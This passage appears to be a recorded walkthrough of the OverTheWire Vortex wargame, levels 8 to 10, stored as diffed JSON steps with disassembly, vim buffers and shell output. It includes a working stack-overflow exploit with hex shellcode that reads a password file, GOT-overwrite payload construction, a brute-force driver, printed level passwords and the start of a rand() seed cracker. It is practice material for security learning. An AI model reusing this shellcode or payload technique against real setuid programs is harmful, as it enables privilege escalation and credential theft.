+      "08049238 <main>:",
+      " 8049238:\t8d 4c 24 04          \tlea    0x4(%esp),%ecx",
+      " 804923c:\t83 e4 f0             \tand    $0xfffffff0,%esp",
+      " 804923f:\tff 71 fc             \tpush   -0x4(%ecx)",
+      " 8049242:\t55                   \tpush   %ebp",
+      " 8049243:\t89 e5                \tmov    %esp,%ebp",
+      " 8049245:\t57                   \tpush   %edi",
+      " 8049246:\t56                   \tpush   %esi",
+      " 8049247:\t53                   \tpush   %ebx",
+      " 8049248:\t51                   \tpush   %ecx",
+      " 8049249:\t83 ec 18             \tsub    $0x18,%esp",
+      " 804924c:\t89 cb                \tmov    %ecx,%ebx",
+      " 804924e:\t6a 00                \tpush   $0x0",
+      " 8049250:\t68 d6 91 04 08       \tpush   $0x80491d6",
+      " 8049255:\t6a 00                \tpush   $0x0"
+     ]
+    },
+    {
+     "cmd": "objdump -d v8 | sed -n '/<main>:/,/^$/p' | head -60",
+     "out": [
+      "08049238 <main>:",
+      " 8049238:\t8d 4c 24 04          \tlea    0x4(%esp),%ecx",
+      " 804923c:\t83 e4 f0             \tand    $0xfffffff0,%esp",
+      " 804923f:\tff 71 fc             \tpush   -0x4(%ecx)",
+      " 8049242:\t55                   \tpush   %ebp",
+      " 8049243:\t89 e5                \tmov    %esp,%ebp",
+      " 8049245:\t57                   \tpush   %edi",
+      " 8049246:\t56                   \tpush   %esi",
+      " 8049247:\t53                   \tpush   %ebx",
+      " 8049248:\t51                   \tpush   %ecx",
+      " 8049249:\t83 ec 18             \tsub    $0x18,%esp",
+      " 804924c:\t89 cb                \tmov    %ecx,%ebx",
+      " 804924e:\t6a 00                \tpush   $0x0",
+      " 8049250:\t68 d6 91 04 08       \tpush   $0x80491d6",
+      " 8049255:\t6a 00                \tpush   $0x0",
+      " 8049257:\t8d 45 e4             \tlea    -0x1c(%ebp),%eax",
+      " 804925a:\t50                   \tpush   %eax",
+      " 804925b:\te8 50 fe ff ff       \tcall   80490b0 <pthread_create@plt>",
+      " 8049260:\t83 c4 10             \tadd    $0x10,%esp",
+      " 8049263:\te8 28 fe ff ff       \tcall   8049090 <getgid@plt>",
+      " 8049268:\t89 c7                \tmov    %eax,%edi",
+      " 804926a:\te8 21 fe ff ff       \tcall   8049090 <getgid@plt>",
+      " 804926f:\t89 c6                \tmov    %eax,%esi",
+      " 8049271:\te8 1a fe ff ff       \tcall   8049090 <getgid@plt>",
+      " 8049276:\t57                   \tpush   %edi",
+      " 8049277:\t56                   \tpush   %esi",
+      " 8049278:\t50                   \tpush   %eax",
+      " 8049279:\t68 aa 00 00 00       \tpush   $0xaa",
+      " 804927e:\te8 1d fe ff ff       \tcall   80490a0 <syscall@plt>",
+      " 8049283:\t83 c4 10             \tadd    $0x10,%esp",
+      " 8049286:\te8 e5 fd ff ff       \tcall   8049070 <getuid@plt>",
+      " 804928b:\t89 c7                \tmov    %eax,%edi",
+      " 804928d:\te8 de fd ff ff       \tcall   8049070 <getuid@plt>",
+      " 8049292:\t89 c6                \tmov    %eax,%esi",
+      " 8049294:\te8 d7 fd ff ff       \tcall   8049070 <getuid@plt>",
+      " 8049299:\t57                   \tpush   %edi",
+      " 804929a:\t56                   \tpush   %esi",
+      " 804929b:\t50                   \tpush   %eax",
+      " 804929c:\t68 a4 00 00 00       \tpush   $0xa4",
+      " 80492a1:\te8 fa fd ff ff       \tcall   80490a0 <syscall@plt>",
+      " 80492a6:\t83 c4 10             \tadd    $0x10,%esp",
+      " 80492a9:\t8b 43 04             \tmov    0x4(%ebx),%eax",
+      " 80492ac:\t83 c0 04             \tadd    $0x4,%eax",
+      " 80492af:\t8b 00                \tmov    (%eax),%eax",
+      " 80492b1:\t83 ec 0c             \tsub    $0xc,%esp",
+      " 80492b4:\t50                   \tpush   %eax",
+      " 80492b5:\te8 5d ff ff ff       \tcall   8049217 <unsafecode>",
+      " 80492ba:\t83 c4 10             \tadd    $0x10,%esp",
+      " 80492bd:\tb8 00 00 00 00       \tmov    $0x0,%eax",
+      " 80492c2:\t8d 65 f0             \tlea    -0x10(%ebp),%esp",
+      " 80492c5:\t59                   \tpop    %ecx",
+      " 80492c6:\t5b                   \tpop    %ebx",
+      " 80492c7:\t5e                   \tpop    %esi",
+      " 80492c8:\t5f                   \tpop    %edi",
+      " 80492c9:\t5d                   \tpop    %ebp",
+      " 80492ca:\t8d 61 fc             \tlea    -0x4(%ecx),%esp",
+      " 80492cd:\tc3                   \tret"
+     ]
+    },
+    {
+     "cmd": "objdump -R v8 | grep -E 'sleep|GOT'",
+     "out": [
+      "0804c00c R_386_JUMP_SLOT   sleep@GLIBC_2.0"
+     ]
+    },
+    {
+     "cmd": "readelf -l v8 | grep -E 'GNU_STACK|RELRO' -A1",
+     "out": [
+      "  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10",
+      "  GNU_RELRO      0x002f00 0x0804bf00 0x0804bf00 0x00100 0x00100 R   0x1"
+     ]
+    },
+    {
+     "cmd": "vim drv8.c",
+     "text": "vim drv8.c -- the empty buffer",
+     "out": [
+      "  1",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "drv8.c                                                                            0,0-1          All",
+      "\"drv8.c\" [New]"
+     ]
+    },
+    {
+     "cmd": "vim drv8.c",
+     "text": "vim drv8.c -- insert chunk 1",
+     "out": [
+      "  1 #include <unistd.h>",
+      "  2 #include <stdio.h>",
+      "  3 int main(int c, char **v){ static char buf[8192]; FILE *f=fopen(v[1],\"rb\");",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "drv8.c [+]                                                                        3,1            All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim drv8.c",
+     "text": "vim drv8.c -- insert chunk 2",
+     "out": [
+      "  1 #include <unistd.h>",
+      "  2 #include <stdio.h>",
+      "  3 int main(int c, char **v){ static char buf[8192]; FILE *f=fopen(v[1],\"rb\");",
+      "  4  size_t n=fread(buf,1,sizeof buf-1,f); fclose(f); buf[n]=0;",
+      "  5  char *a[]={\"/vortex/vortex8\", buf, 0}; execv(a[0],a); return 51; }",
+      "  6",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "drv8.c [+]                                                                        6,1            All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim drv8.c",
+     "text": "vim drv8.c -- finished, before :wq",
+     "out": [
+      "  1 #include <unistd.h>",
+      "  2 #include <stdio.h>",
+      "  3 int main(int c, char **v){ static char buf[8192]; FILE *f=fopen(v[1],\"rb\");",
+      "  4  size_t n=fread(buf,1,sizeof buf-1,f); fclose(f); buf[n]=0;",
+      "  5  char *a[]={\"/vortex/vortex8\", buf, 0}; execv(a[0],a); return 51; }",
+      "  6",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "drv8.c [+]                                                                        6,1            All",
+      "                                                                                         ^["
+     ]
+    },
+    {
+     "cmd": "gcc -o drv8 drv8.c && ls -l drv8",
+     "out": [
+      "-rwxrwxr-x 1 vortex8 vortex8 16160 Nov 16 13:07 drv8"
+     ]
+    },
+    {
+     "cmd": "vim solve8.py",
+     "text": "vim solve8.py -- the empty buffer",
+     "out": [
+      "  1",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "solve8.py                                                                         0,0-1          All",
+      "\"solve8.py\" [New]"
+     ]
+    },
+    {
+     "cmd": "vim solve8.py",
+     "text": "vim solve8.py -- insert chunk 1",
+     "out": [
+      "  1 import os, time, select, sys, re",
+      "  2",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "solve8.py [+]                                                                     2,1            All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim solve8.py",
+     "text": "vim solve8.py -- insert chunk 2",
+     "out": [
+      "  1 import os, time, select, sys, re",
+      "  2",
+      "  3 SC2UID = bytes.fromhex(",
+      "  4     \"31c0b018cd805031c0b031cd805031c0b00431dbb30189e131d2b208cd80ebfe\")",
+      "  5 SC2PW = bytes.fromhex(",
+      "  6     \"31c050\"",
+      "  7     \"6874657839\"",
+      "  8     \"682f766f72\"",
+      "  9     \"6870617373\"",
+      " 10     \"687465785f\"",
+      " 11     \"682f766f72\"",
+      " 12     \"682f657463\"",
+      " 13     \"89e331c9b005cd80\"",
+      " 14     \"89c3b00389e131d2b264cd80\"",
+      " 15     \"89c2b004b30189e1cd80\"",
+      " 16     \"ebfe\"",
+      " 17 )",
+      " 18",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "solve8.py [+]                                                                     18,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim solve8.py",
+     "text": "vim solve8.py -- insert chunk 3",
+     "out": [
+      "  8     \"682f766f72\"",
+      "  9     \"6870617373\"",
+      " 10     \"687465785f\"",
+      " 11     \"682f766f72\"",
+      " 12     \"682f657463\"",
+      " 13     \"89e331c9b005cd80\"",
+      " 14     \"89c3b00389e131d2b264cd80\"",
+      " 15     \"89c2b004b30189e1cd80\"",
+      " 16     \"ebfe\"",
+      " 17 )",
+      " 18",
+      " 19 def build(buf, sc2, out):",
+      " 20     TOTAL = 1100",
+      " 21     OFF = 1036",
+      " 22     sc1 = (bytes.fromhex(\"b8\") + (buf + 48).to_bytes(4, \"little\")",
+      " 23            + bytes.fromhex(\"a30cc00408\")",
+      " 24            + bytes.fromhex(\"68e3910408\")",
+      " 25            + bytes.fromhex(\"c3\"))",
+      " 26     sc1_addr = buf + 8",
+      " 27     p = bytearray(b\"A\" * TOTAL)",
+      " 28     p[8:8+len(sc1)] = sc1",
+      " 29     p[48:48+len(sc2)] = sc2",
+      " 30     p[OFF-4:OFF] = (0x0804a008).to_bytes(4, \"little\")",
+      " 31     p[OFF:OFF+4] = sc1_addr.to_bytes(4, \"little\")",
+      " 32     if b\"\\x00\" in p:",
+      " 33         raise ValueError(\"NUL\")",
+      " 34     open(out, \"wb\").write(bytes(p))",
+      " 35",
+      "solve8.py [+]                                                                     35,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim solve8.py",
+     "text": "vim solve8.py -- insert chunk 4",
+     "out": [
+      " 35",
+      " 36 def trial(buf, sc2, wait):",
+      " 37     build(buf, sc2, \"pay_f.bin\")",
+      " 38     r, w = os.pipe()",
+      " 39     pid = os.fork()",
+      " 40     if pid == 0:",
+      " 41         os.dup2(w, 1)",
+      " 42         os.execv(os.getcwd() + \"/drv8\", [\"drv8\", \"pay_f.bin\"])",
+      " 43     os.close(w)",
+      " 44     out = b\"\"",
+      " 45     end = time.time() + wait",
+      " 46     while time.time() < end:",
+      " 47         rr, _, _ = select.select([r], [], [], 0.05)",
+      " 48         if rr:",
+      " 49             d = os.read(r, 4096)",
+      " 50             if not d:",
+      " 51                 break",
+      " 52             out += d",
+      " 53             if len(out) > 20:",
+      " 54                 break",
+      " 55     st = os.waitpid(pid, os.WNOHANG)",
+      " 56     alive = st[0] == 0",
+      " 57     if alive:",
+      " 58         os.kill(pid, 9)",
+      " 59         st = os.waitpid(pid, 0)",
+      " 60     os.close(r)",
+      " 61     return out, st[1]",
+      " 62",
+      "solve8.py [+]                                                                     62,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim solve8.py",
+     "text": "vim solve8.py -- insert chunk 5",
+     "out": [
+      " 53             if len(out) > 20:",
+      " 54                 break",
+      " 55     st = os.waitpid(pid, os.WNOHANG)",
+      " 56     alive = st[0] == 0",
+      " 57     if alive:",
+      " 58         os.kill(pid, 9)",
+      " 59         st = os.waitpid(pid, 0)",
+      " 60     os.close(r)",
+      " 61     return out, st[1]",
+      " 62",
+      " 63 lo, hi = int(sys.argv[1], 16), int(sys.argv[2], 16)",
+      " 64 hit = None",
+      " 65 for cand in range(lo, hi, 8):",
+      " 66     try:",
+      " 67         out, st = trial(cand, SC2UID, 1.3)",
+      " 68     except ValueError:",
+      " 69         continue",
+      " 70     print(hex(cand), st & 0x7f, flush=True)",
+      " 71     if b\"\\x91\\x13\" in out:",
+      " 72         hit = cand",
+      " 73         print(\"UID-HIT:\", out[:24].hex(), flush=True)",
+      " 74         break",
+      " 75 if hit is None:",
+      " 76     print(\"NO HIT\", flush=True)",
+      " 77     sys.exit(1)",
+      " 78 out, st = trial(hit, SC2PW, 3.2)",
+      " 79 print(\"PW:\", out.decode('latin-1').replace(\"\\n\", \" \"), flush=True)",
+      " 80",
+      "solve8.py [+]                                                                     80,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim solve8.py",
+     "text": "vim solve8.py -- finished, before :wq",
+     "out": [
+      " 53             if len(out) > 20:",
+      " 54                 break",
+      " 55     st = os.waitpid(pid, os.WNOHANG)",
+      " 56     alive = st[0] == 0",
+      " 57     if alive:",
+      " 58         os.kill(pid, 9)",
+      " 59         st = os.waitpid(pid, 0)",
+      " 60     os.close(r)",
+      " 61     return out, st[1]",
+      " 62",
+      " 63 lo, hi = int(sys.argv[1], 16), int(sys.argv[2], 16)",
+      " 64 hit = None",
+      " 65 for cand in range(lo, hi, 8):",
+      " 66     try:",
+      " 67         out, st = trial(cand, SC2UID, 1.3)",
+      " 68     except ValueError:",
+      " 69         continue",
+      " 70     print(hex(cand), st & 0x7f, flush=True)",
+      " 71     if b\"\\x91\\x13\" in out:",
+      " 72         hit = cand",
+      " 73         print(\"UID-HIT:\", out[:24].hex(), flush=True)",
+      " 74         break",
+      " 75 if hit is None:",
+      " 76     print(\"NO HIT\", flush=True)",
+      " 77     sys.exit(1)",
+      " 78 out, st = trial(hit, SC2PW, 3.2)",
+      " 79 print(\"PW:\", out.decode('latin-1').replace(\"\\n\", \" \"), flush=True)",
+      " 80",
+      "solve8.py [+]                                                                     80,1           All",
+      "                                                                                         ^["
+     ]
+    },
+    {
+     "cmd": "wc -l solve8.py",
+     "out": [
+      "80 solve8.py"
+     ]
+    },
+    {
+     "cmd": "# timeout 120 python3 solve8.py 0xffffd960 0xffffd9b0   # exploit run transported over ssh -T (no pty)",
+     "out": []
+    },
+    {
+     "cmd": "0xffffd960 11\n0xffffd968 11\n0xffffd970 11\n0xffffd978 9\n0xffffd980 9\n0xffffd988 9\n0xffffd990 9\nUID-HIT: 300a9013000090130000300a9113000090130000\nPW: 0 0 XdTW4yCeq\nexit",
+     "out": [
+      "logout"
+     ]
+    },
+    {
+     "cmd": "ssh vortex9@vortex.labs.overthewire.org -p 2228",
+     "out": []
+    },
+    {
+     "cmd": "id",
+     "out": [
+      "uid=5009(vortex9) gid=5009(vortex9) groups=5009(vortex9)"
+     ]
+    },
+    {
+     "cmd": "cat /etc/vortex_pass/vortex9",
+     "out": [
+      "XdTW4yCeq"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout"
+     ]
+    }
+   ]
+  },
+  {
+   "lvl": 9,
+   "pw": "95KsP1i3K",
+   "user": "vortex9",
+   "steps": [
+    {
+     "cmd": "ssh vortex9@vortex.labs.overthewire.org -p 2228",
+     "out": []
+    },
+    {
+     "cmd": "d=/tmp/l9rec-$RANDOM; mkdir $d && cd $d && echo WORKDIR=$d",
+     "out": [
+      "WORKDIR=/tmp/l9rec-10419"
+     ]
+    },
+    {
+     "cmd": "id",
+     "out": [
+      "uid=5009(vortex9) gid=5009(vortex9) groups=5009(vortex9)"
+     ]
+    },
+    {
+     "cmd": "ls -la /vortex/ | grep -E 'vortex(8|9|10)$'",
+     "out": [
+      "-r-sr-x---  1 vortex11 vortex10 15352 Oct 25 13:40 vortex10",
+      "-r-sr-x---  1 vortex9  vortex8  15152 Oct 25 13:41 vortex8"
+     ]
+    },
+    {
+     "cmd": "stat -c '%a %U %G %n' /vortex/vortex9",
+     "out": [
+      "stat: cannot statx '/vortex/vortex9': No such file or directory"
+     ]
+    },
+    {
+     "cmd": "stat -c '%a %U %G %n' /vortex/vortex10 /etc/vortex_pass/vortex10",
+     "out": [
+      "4550 vortex11 vortex10 /vortex/vortex10",
+      "400 vortex10 vortex10 /etc/vortex_pass/vortex10"
+     ]
+    },
+    {
+     "cmd": "getent group vortex10; groups",
+     "out": [
+      "vortex10:x:5010:",
+      "vortex9"
+     ]
+    },
+    {
+     "cmd": "/vortex/vortex10; echo \"RC=$?\"",
+     "out": [
+      "-bash: /vortex/vortex10: Permission denied",
+      "RC=126"
+     ]
+    },
+    {
+     "cmd": "find /var/mail -user vortex9 2>/dev/null",
+     "out": [
+      "/var/mail/vortex9"
+     ]
+    },
+    {
+     "cmd": "ls -la /var/mail/vortex9",
+     "out": [
+      "-rw-r----- 1 vortex9 vortex9 10 Oct 25 13:41 /var/mail/vortex9"
+     ]
+    },
+    {
+     "cmd": "cat /var/mail/vortex9",
+     "out": [
+      "95KsP1i3K"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout"
+     ]
+    },
+    {
+     "cmd": "ssh vortex10@vortex.labs.overthewire.org -p 2228",
+     "out": []
+    },
+    {
+     "cmd": "id",
+     "out": [
+      "uid=5010(vortex10) gid=5010(vortex10) groups=5010(vortex10)"
+     ]
+    },
+    {
+     "cmd": "cat /etc/vortex_pass/vortex10",
+     "out": [
+      "95KsP1i3K"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout"
+     ]
+    }
+   ]
+  },
+  {
+   "lvl": 10,
+   "pw": "xb4DVZ2av",
+   "user": "vortex10",
+   "steps": [
+    {
+     "cmd": "ssh vortex10@vortex.labs.overthewire.org -p 2228",
+     "out": []
+    },
+    {
+     "cmd": "d=/tmp/l10rec-$RANDOM; mkdir $d && cd $d && echo WORKDIR=$d",
+     "out": [
+      "WORKDIR=/tmp/l10rec-25004"
+     ]
+    },
+    {
+     "cmd": "cp /vortex/vortex10 v10 && md5sum v10",
+     "out": [
+      "49dcf2fee434ab1eb8f0b5bdc4104729  v10"
+     ]
+    },
+    {
+     "cmd": "ls -l /vortex/vortex10; ls -l /etc/vortex_pass/vortex11",
+     "out": [
+      "-r-sr-x--- 1 vortex11 vortex10 15352 Oct 25 13:40 /vortex/vortex10",
+      "-r-------- 1 vortex11 vortex11 10 Oct 25 13:40 /etc/vortex_pass/vortex11"
+     ]
+    },
+    {
+     "cmd": "/vortex/vortex10 </dev/null | head -3",
+     "out": [
+      "[ 79d6a859, 5f245bf0, 5315bdb0, 638cac54, 7f914e1c, 73998946, 36eeacfa, 5bd80241, 5d33819d, 03c7e7af, 7e1ca850, 6ad8cca7, 2c46bb85, 28e24458, 31252f3d, 671fc9c3, 2b463661, 31fc2f53, 22fcff00, 5989c008,]",
+      "Nope, try again"
+     ]
+    },
+    {
+     "cmd": "objdump -d v10 | sed -n '/<main>:/,/^$/p' | head -90",
+     "out": [
+      "08049246 <main>:",
+      " 8049246:\t8d 4c 24 04          \tlea    0x4(%esp),%ecx",
+      " 804924a:\t83 e4 f0             \tand    $0xfffffff0,%esp",
+      " 804924d:\tff 71 fc             \tpush   -0x4(%ecx)",
+      " 8049250:\t55                   \tpush   %ebp",
+      " 8049251:\t89 e5                \tmov    %esp,%ebp",
+      " 8049253:\t56                   \tpush   %esi",
+      " 8049254:\t53                   \tpush   %ebx",
+      " 8049255:\t51                   \tpush   %ecx",
+      " 8049256:\t81 ec 8c 00 00 00    \tsub    $0x8c,%esp",
+      " 804925c:\t65 a1 14 00 00 00    \tmov    %gs:0x14,%eax",
+      " 8049262:\t89 45 e4             \tmov    %eax,-0x1c(%ebp)",
+      " 8049265:\t31 c0                \txor    %eax,%eax",
+      " 8049267:\t83 ec 0c             \tsub    $0xc,%esp",
+      " 804926a:\t8d 45 84             \tlea    -0x7c(%ebp),%eax",
+      " 804926d:\t50                   \tpush   %eax",
+      " 804926e:\te8 fd fd ff ff       \tcall   8049070 <times@plt>",
+      " 8049273:\t83 c4 10             \tadd    $0x10,%esp",
+      " 8049276:\t89 85 7c ff ff ff    \tmov    %eax,-0x84(%ebp)",
+      " 804927c:\t8b 55 84             \tmov    -0x7c(%ebp),%edx",
+      " 804927f:\t8b 45 88             \tmov    -0x78(%ebp),%eax",
+      " 8049282:\t01 c2                \tadd    %eax,%edx",
+      " 8049284:\t8b 45 8c             \tmov    -0x74(%ebp),%eax",
+      " 8049287:\t01 c2                \tadd    %eax,%edx",
+      " 8049289:\t8b 45 90             \tmov    -0x70(%ebp),%eax",
+      " 804928c:\t01 d0                \tadd    %edx,%eax",
+      " 804928e:\t01 85 7c ff ff ff    \tadd    %eax,-0x84(%ebp)",
+      " 8049294:\te8 47 fe ff ff       \tcall   80490e0 <clock@plt>",
+      " 8049299:\t01 85 7c ff ff ff    \tadd    %eax,-0x84(%ebp)",
+      " 804929f:\t83 ec 0c             \tsub    $0xc,%esp",
+      " 80492a2:\t6a 00                \tpush   $0x0",
+      " 80492a4:\te8 d7 fd ff ff       \tcall   8049080 <time@plt>",
+      " 80492a9:\t83 c4 10             \tadd    $0x10,%esp",
+      " 80492ac:\t01 85 7c ff ff ff    \tadd    %eax,-0x84(%ebp)",
+      " 80492b2:\t8b 95 7c ff ff ff    \tmov    -0x84(%ebp),%edx",
+      " 80492b8:\t89 d0                \tmov    %edx,%eax",
+      " 80492ba:\tc1 f8 1f             \tsar    $0x1f,%eax",
+      " 80492bd:\tc1 e8 18             \tshr    $0x18,%eax",
+      " 80492c0:\t01 c2                \tadd    %eax,%edx",
+      " 80492c2:\t0f b6 d2             \tmovzbl %dl,%edx",
+      " 80492c5:\t29 c2                \tsub    %eax,%edx",
+      " 80492c7:\tb8 80 00 00 00       \tmov    $0x80,%eax",
+      " 80492cc:\t29 d0                \tsub    %edx,%eax",
+      " 80492ce:\t89 85 7c ff ff ff    \tmov    %eax,-0x84(%ebp)",
+      " 80492d4:\t83 ec 0c             \tsub    $0xc,%esp",
+      " 80492d7:\t6a 00                \tpush   $0x0",
+      " 80492d9:\te8 a2 fd ff ff       \tcall   8049080 <time@plt>",
+      " 80492de:\t83 c4 10             \tadd    $0x10,%esp",
+      " 80492e1:\t8b 95 7c ff ff ff    \tmov    -0x84(%ebp),%edx",
+      " 80492e7:\t01 d0                \tadd    %edx,%eax",
+      " 80492e9:\t89 45 80             \tmov    %eax,-0x80(%ebp)",
+      " 80492ec:\t83 ec 0c             \tsub    $0xc,%esp",
+      " 80492ef:\tff 75 80             \tpush   -0x80(%ebp)",
+      " 80492f2:\te8 f9 fd ff ff       \tcall   80490f0 <srand@plt>",
+      " 80492f7:\t83 c4 10             \tadd    $0x10,%esp",
+      " 80492fa:\ta1 48 c0 04 08       \tmov    0x804c048,%eax",
+      " 80492ff:\t6a 00                \tpush   $0x0",
+      " 8049301:\t6a 02                \tpush   $0x2",
+      " 8049303:\t6a 00                \tpush   $0x0",
+      " 8049305:\t50                   \tpush   %eax",
+      " 8049306:\te8 f5 fd ff ff       \tcall   8049100 <setvbuf@plt>",
+      " 804930b:\t83 c4 10             \tadd    $0x10,%esp",
+      " 804930e:\tc7 85 78 ff ff ff 00 \tmovl   $0x0,-0x88(%ebp)",
+      " 8049315:\t00 00 00 ",
+      " 8049318:\teb 0c                \tjmp    8049326 <main+0xe0>",
+      " 804931a:\te8 01 fe ff ff       \tcall   8049120 <rand@plt>",
+      " 804931f:\t83 85 78 ff ff ff 01 \taddl   $0x1,-0x88(%ebp)",
+      " 8049326:\t8b 85 78 ff ff ff    \tmov    -0x88(%ebp),%eax",
+      " 804932c:\t3b 85 7c ff ff ff    \tcmp    -0x84(%ebp),%eax",
+      " 8049332:\t7c e6                \tjl     804931a <main+0xd4>",
+      " 8049334:\t83 ec 0c             \tsub    $0xc,%esp",
+      " 8049337:\t6a 5b                \tpush   $0x5b",
+      " 8049339:\te8 d2 fd ff ff       \tcall   8049110 <putchar@plt>",
+      " 804933e:\t83 c4 10             \tadd    $0x10,%esp",
+      " 8049341:\tc7 85 78 ff ff ff 00 \tmovl   $0x0,-0x88(%ebp)",
+      " 8049348:\t00 00 00 ",
+      " 804934b:\teb 33                \tjmp    8049380 <main+0x13a>",
+      " 804934d:\te8 ce fd ff ff       \tcall   8049120 <rand@plt>",
+      " 8049352:\t89 c2                \tmov    %eax,%edx",
+      " 8049354:\t8b 85 78 ff ff ff    \tmov    -0x88(%ebp),%eax",
+      " 804935a:\t89 54 85 94          \tmov    %edx,-0x6c(%ebp,%eax,4)",
+      " 804935e:\t8b 85 78 ff ff ff    \tmov    -0x88(%ebp),%eax",
+      " 8049364:\t8b 44 85 94          \tmov    -0x6c(%ebp,%eax,4),%eax",
+      " 8049368:\t83 ec 08             \tsub    $0x8,%esp",
+      " 804936b:\t50                   \tpush   %eax",
+      " 804936c:\t68 08 a0 04 08       \tpush   $0x804a008",
+      " 8049371:\te8 ea fc ff ff       \tcall   8049060 <printf@plt>",
+      " 8049376:\t83 c4 10             \tadd    $0x10,%esp",
+      " 8049379:\t83 85 78 ff ff ff 01 \taddl   $0x1,-0x88(%ebp)",
+      " 8049380:\t83 bd 78 ff ff ff 13 \tcmpl   $0x13,-0x88(%ebp)"
+     ]
+    },
+    {
+     "cmd": "objdump -R v10 | grep -E 'rand|srand|times|clock|execlp|setresuid'",
+     "out": [
+      "0804c000 R_386_JUMP_SLOT   setresuid@GLIBC_2.0",
+      "0804c010 R_386_JUMP_SLOT   times@GLIBC_2.0",
+      "0804c020 R_386_JUMP_SLOT   execlp@GLIBC_2.0",
+      "0804c02c R_386_JUMP_SLOT   clock@GLIBC_2.0",
+      "0804c030 R_386_JUMP_SLOT   srand@GLIBC_2.0",
+      "0804c03c R_386_JUMP_SLOT   rand@GLIBC_2.0"
+     ]
+    },
+    {
+     "cmd": "readelf -l v10 | grep -E 'GNU_STACK|RELRO' -A1",
+     "out": [
+      "  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10",
+      "  GNU_RELRO      0x002f00 0x0804bf00 0x0804bf00 0x00100 0x00100 R   0x1"
+     ]
+    },
+    {
+     "cmd": "vim cracke.c",
+     "text": "vim cracke.c -- the empty buffer",
+     "out": [
+      "  1",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "cracke.c                                                                          0,0-1          All",
+      "\"cracke.c\" [New]"
+     ]
+    },
+    {
+     "cmd": "vim cracke.c",
+     "text": "vim cracke.c -- insert chunk 1",
+     "out": [
+      "  1 #include <stdio.h>",
+      "  2 #include <stdlib.h>",
+      "  3 #include <string.h>",
+      "  4 #include <time.h>",
+      "  5",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "cracke.c [+]                                                                      5,1            All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim cracke.c",
+     "text": "vim cracke.c -- insert chunk 2",
+     "out": [
+      "  1 #include <stdio.h>",
+      "  2 #include <stdlib.h>",
+      "  3 #include <string.h>",
+      "  4 #include <time.h>",
+      "  5",
+      "  6 #define NV 20",
+      "  7",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "cracke.c [+]                                                                      7,1            All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim cracke.c",
+     "text": "vim cracke.c -- insert chunk 3",
+     "out": [
+      "  1 #include <stdio.h>",
+      "  2 #include <stdlib.h>",
+      "  3 #include <string.h>",
+      "  4 #include <time.h>",
+      "  5",
+      "  6 #define NV 20",
+      "  7",
+      "  8 /* Brute-force the srand() seed: for every candidate time value and skip",
+      "  9    count, reseed the target's own libc rand() and compare the next 20",
+      " 10    outputs against the array the level printed. */",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "cracke.c [+]                                                                      10,1           All",
